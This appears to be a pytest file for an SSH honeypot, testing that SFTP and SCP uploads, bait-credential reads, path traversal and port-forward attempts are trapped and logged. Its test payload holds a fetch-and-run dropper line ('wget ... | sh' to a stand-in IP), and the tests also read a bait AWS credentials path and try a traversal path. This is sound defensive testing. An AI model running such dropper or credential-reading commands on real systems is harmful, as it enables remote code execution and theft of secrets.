"""Gap 3: SFTP / SCP upload capture and port-forward traps on the SSH decoy."""
import asyncio
import hashlib
import json
import os
import socket
import threading

import asyncssh
import pandas as pd
import pytest

from src.analytics import CERFEngine
from tests.test_decoy import _run_with_decoy, temp_env  # noqa: F401  (temp_env is a fixture)

PAYLOAD = b"#!/bin/sh\nwget http://198.51.100.7/m -O- | sh\n" + bytes(range(256))


def connect(port):
    return asyncssh.connect("127.0.0.1", port, username="root", password="123456", known_hosts=None)


def with_client(coro_fn):
    """Adapt `async def f(conn)` to the blocking client function _run_with_decoy expects."""
    def client(ports):
        async def main():
            async with connect(ports["ssh"]) as conn:
                return await coro_fn(conn, ports)
        return asyncio.run(main())
    return client


def samples(temp_dir):
    path = os.path.join(temp_dir, "samples.jsonl")
    return [json.loads(line) for line in open(path)] if os.path.exists(path) else []


def alerts(temp_dir):
    return [json.loads(line) for line in open(os.path.join(temp_dir, "alerts.jsonl"))]


def test_s1_sftp_upload_is_captured_and_virtual(temp_env):
    temp_dir, telemetry_path = temp_env
    host_probe = "/tmp/cerda_sftp_probe_file"

    async def work(conn, ports):
        async with conn.start_sftp_client() as sftp:
            async with sftp.open("/tmp/bot.sh", "wb") as f:
                await f.write(PAYLOAD)
            names = lambda listing: [n for n in listing if n not in (".", "..")]  # SFTP listings include . and ..
            seen = {
                "listing": names(await sftp.listdir("/tmp")), "size": await sftp.getsize("/tmp/bot.sh"),
                "isdir": await sftp.isdir("/tmp"), "isfile": await sftp.isfile("/tmp/bot.sh"),
            }
            async with sftp.open("/tmp/bot.sh", "rb") as f:
                seen["back"] = await f.read()
            await sftp.mkdir("/tmp/work")
            await sftp.rename("/tmp/bot.sh", "/tmp/work/bot2.sh")
            seen["moved"] = names(await sftp.listdir("/tmp/work"))
            await sftp.remove("/tmp/work/bot2.sh")
            seen["after_rm"] = names(await sftp.listdir("/tmp/work"))
            async with sftp.open("/root/.aws/credentials", "rb") as f:  # bait file
                seen["bait"] = (await f.read())[:20]
            for name, path in (("missing", "/nope/x"), ("traversal", "../../../../Windows/win.ini")):
                try:
                    await sftp.stat(path)
                    seen[name] = "FOUND"
                except asyncssh.SFTPNoSuchFile:
                    seen[name] = "no such file"
            await sftp.chmod("/tmp", 0o777)  # accepted, changes nothing
            await sftp.makedirs("/tmp/work/deep", exist_ok=True)
        return seen

    seen = _run_with_decoy(temp_dir, telemetry_path, with_client(work))
    assert "bot.sh" in seen["listing"] and seen["size"] == len(PAYLOAD) and seen["isdir"] and seen["isfile"]
    assert seen["back"] == PAYLOAD  # an attacker who checks their upload finds it
    assert seen["moved"] == ["bot2.sh"] and seen["after_rm"] == [] and seen["bait"]
    assert seen["missing"] == seen["traversal"] == "no such file"
    assert not os.path.exists(host_probe) and not os.path.exists("/tmp/bot.sh")  # nothing reached the host disk
    rows = samples(temp_dir)
    assert [(r["origin"], r["source"], r["sha256"]) for r in rows] == \
           [("upload", "sftp /tmp/bot.sh", hashlib.sha256(PAYLOAD).hexdigest())]
    assert rows[0]["type"] == "script" and rows[0]["protocol"] == "SSH"
    kinds = [a["kind"] for a in alerts(temp_dir)]
    assert "malware_captured" in kinds and "honeytoken_read" in kinds


def test_s2_scp_upload_and_download(temp_env):
    temp_dir, telemetry_path = temp_env
    local = os.path.join(temp_dir, "drop.bin")
    open(local, "wb").write(PAYLOAD)
    fetched = os.path.join(temp_dir, "got.txt")

    async def work(conn, ports):
        await asyncssh.scp(local, (conn, "/tmp/dropper"))
        await asyncssh.scp((conn, "/etc/hostname"), fetched)
        return True

    assert _run_with_decoy(temp_dir, telemetry_path, with_client(work))
    assert [(r["origin"], r["source"]) for r in samples(temp_dir)] == [("upload", "sftp /tmp/dropper")]
    assert samples(temp_dir)[0]["sha256"] == hashlib.sha256(PAYLOAD).hexdigest()
    assert open(fetched).read().strip() == "srv-prod-01"  # scp -f served the virtual file


def test_s3_upload_limits(temp_env):
    temp_dir, telemetry_path = temp_env

    async def work(conn, ports):
        results = {}
        async with conn.start_sftp_client() as sftp:
            try:
                async with sftp.open("/tmp/huge", "wb") as f:
                    await f.write(b"A" * 5000)
                results["big"] = "stored"
            except asyncssh.SFTPError as e:
                results["big"] = type(e).__name__
            async with sftp.open("/tmp/ok", "wb") as f:
                await f.write(b"small")
            try:
                async with sftp.open("/nonexistent_dir/f", "wb") as f:
                    await f.write(b"x")
                results["nodir"] = "stored"
            except asyncssh.SFTPError as e:
                results["nodir"] = type(e).__name__
        return results

    results = _run_with_decoy(temp_dir, telemetry_path, with_client(work), max_sample_bytes=1000)
    assert results == {"big": "SFTPFailure", "nodir": "SFTPNoSuchFile"}  # SFTP v3 has no "no space" code, so it is a plain failure
    assert [r["source"] for r in samples(temp_dir)] == ["sftp /tmp/ok"]  # the oversize upload was not kept


def test_s4_local_forward_is_a_trap_that_records_and_connects_nowhere(temp_env):
    temp_dir, telemetry_path = temp_env
    victim = socket.socket()
    victim.bind(("127.0.0.1", 0))
    victim.listen(5)
    victim.settimeout(1.5)
    victim_port = victim.getsockname()[1]
    hits = []
    threading.Thread(target=lambda: hits.append(victim.accept()[0]) if True else None, daemon=True).start()

    async def work(conn, ports):
        listener = await conn.forward_local_port("127.0.0.1", 0, "127.0.0.1", victim_port)
        reader, writer = await asyncio.open_connection("127.0.0.1", listener.get_port())
        writer.write(b"GET /admin HTTP/1.1\r\nHost: victim.example\r\n\r\n")
        await writer.drain()
        writer.write_eof()
        got = await asyncio.wait_for(reader.read(100), 8)  # the trap sends nothing back and closes
        listener.close()
        return got

    assert _run_with_decoy(temp_dir, telemetry_path, with_client(work)) == b""
    victim.close()
    assert hits == []  # the decoy never opened a connection to the target
    rows = [r for r in samples(temp_dir) if r["origin"] == "forward"]
    assert len(rows) == 1 and rows[0]["source"] == f"127.0.0.1:{victim_port}"
    assert rows[0]["sha256"] == hashlib.sha256(b"GET /admin HTTP/1.1\r\nHost: victim.example\r\n\r\n").hexdigest()
    assert any(a["kind"] == "port_forward_attempt" and str(victim_port) in a["value"] for a in alerts(temp_dir))
    signals = pd.read_csv(os.path.join(temp_dir, "signals.csv"))
    assert f"L 127.0.0.1:{victim_port}" in set(signals[signals["kind"] == "port_forward"]["value"])


def test_s5_remote_forward_refused_and_forward_budget(temp_env):
    temp_dir, telemetry_path = temp_env

    async def work(conn, ports):
        out = {}
        try:
            await conn.forward_remote_port("", 0, "localhost", 80)
            out["remote"] = "accepted"
        except Exception as e:
            out["remote"] = type(e).__name__
        opened = refused = 0
        for _ in range(8):  # direct-tcpip channels: the first few are trapped, then refused
            try:
                chan, _ = await conn.create_connection(asyncssh.SSHTCPSession, "victim.example", 25)
                opened += 1
            except asyncssh.ChannelOpenError:
                refused += 1
        out.update(opened=opened, refused=refused)
        return out

    out = _run_with_decoy(temp_dir, telemetry_path, with_client(work))
    assert out["remote"] == "ChannelListenError" and out["opened"] == 5 and out["refused"] == 3
    kinds = [a["value"] for a in alerts(temp_dir) if a["kind"] == "port_forward_attempt"]
    assert any(v.startswith("remote listen") for v in kinds) and any("victim.example:25" in v for v in kinds)


def test_s6_engine_exposes_forward_and_sftp_signals(temp_env):
    temp_dir, _ = temp_env
    signals_path = os.path.join(temp_dir, "signals.csv")
    from src.decoy.signals import SignalLogger
    log = SignalLogger(signals_path)
    log.log("s1", "1.1.1.1", "SSH", "port_forward", "L smtp.example:25")
    log.log("s1", "1.1.1.1", "SSH", "port_forward", "L smtp.example:587")
    log.log("s1", "1.1.1.1", "SSH", "sftp_upload", "/tmp/x 12B")
    engine = CERFEngine(telemetry_path=os.path.join(temp_dir, "none.csv"), output_dir=temp_dir, embedding="pca",
                        signals_path=signals_path)
    df = engine._add_signals(pd.DataFrame({"session_id": ["s1", "s2"]}))
    assert df.loc[0, "forward_targets"] == "L smtp.example:25 L smtp.example:587" or "smtp.example:587" in df.loc[0, "forward_targets"]
    assert df.loc[0, "sftp_uploads"] == "/tmp/x 12B" and df.loc[1, "forward_targets"] == ""
